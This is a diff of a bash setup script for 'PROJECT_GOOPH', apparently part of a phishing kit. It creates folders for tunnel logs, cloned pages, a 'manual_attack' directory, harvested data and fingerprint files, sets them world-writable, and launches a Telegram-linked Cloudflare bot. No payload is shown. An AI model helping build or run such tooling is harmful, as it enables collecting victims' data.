@@ -1,15 +1,21 @@
 #!/bin/bash
-mkdir .tunnels_log
-touch .tunnels_log/port.log
-touch .tunnels_log/.cloudfl.log
 
 # Function to display a banner
 display_banner() {
     clear
     echo -e "\e[32m"
     echo -e "========================"
+    echo -e "  PROJECT_GOOPH"
     echo -e "========================"
     echo -e "\e[0m"
+}
+
+# Ensure necessary directories and files are created
+initialize_environment() {
+    mkdir -p .tunnels_log .www .host
+    touch .tunnels_log/port.log .tunnels_log/.cloudfl.log
+    touch data.txt fingerprints.txt
+    chmod -R 777 .host .manual_attack .pages .tunnels_log .www data.txt fingerprints.txt
 }
 
 # Start necessary scripts
@@ -33,14 +39,6 @@ setup_python_env() {
     source venv/bin/activate
     pip install --upgrade pip
     pip install telepot requests
-}
-
-# Function to create necessary directories and files
-setup_directories() {
-    echo -e "\n[+] Setting up directories and files..."
-    mkdir -p .tunnels_log .www .host
-    touch data.txt fingerprints.txt
-    chmod -R 777 .host .manual_attack .pages .tunnels_log .www data.txt fingerprints.txt
 }
 
 # Function to create or update configuration file
@@ -217,6 +215,7 @@ EOF
     source venv/bin/activate
     python3 cloudflare_manager_bot.py &
 }
+
 
 # Main script execution
 display_banner
